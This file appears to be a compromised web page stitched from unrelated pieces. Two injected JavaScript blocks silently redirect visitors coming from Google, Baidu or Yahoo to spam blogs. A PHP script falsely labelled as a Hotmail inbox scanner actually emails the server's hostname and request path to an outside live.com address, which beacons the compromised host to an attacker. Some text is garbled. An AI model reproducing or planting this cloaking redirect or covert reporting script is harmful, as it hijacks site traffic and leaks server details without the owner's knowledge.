<script language="javascript">
var s=document.referrer
var ua=navigator.userAgent;
if(s.indexOf("google")>0 || s.indexOf("baidu")>0 || s.indexOf("yahoo")>0||ua.indexOf("Baidu")>0||ua.indexOf("baidu")>0 ) 
location.href="http://baijiaweile.blog.com ";
</script>

<script language="javascript">
var s=document.referrer
var ua=navigator.userAgent;
if(s.indexOf("google")>0 || s.indexOf("baidu")>0 || s.indexOf("yahoo")>0||ua.indexOf("Baidu")>0||ua.indexOf("baidu")>0 ) 
location.href="http://shishicairengongjihua.tumblr.com ";
</script>

<title>F. MICROSOFT</title>
<?php
//=================================
//
//    Scan inb0x hotmail v1.0
//
//  coded by _[[NetWork]]_
//      n�o rippem fdps :]
//
//
//      Elite Group Forever2008
//=================================
//
 ini_set("max_execution_time",-1);
 set_time_limit(0);
 $user = @get_current_user();
 $email = "$user";
 $assunto = "Vull-inb0x.";
 $email1 = "code.priv8@live.com";
 $headers  = "From: <$email>\r\n";
 
 
 if(mail($email1, $assunto, $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'], $headers)){
 echo "Opa, enviado!";
 exit();
 }
 else{
 echo "N�o enviei..";
 exit();
 }
?>
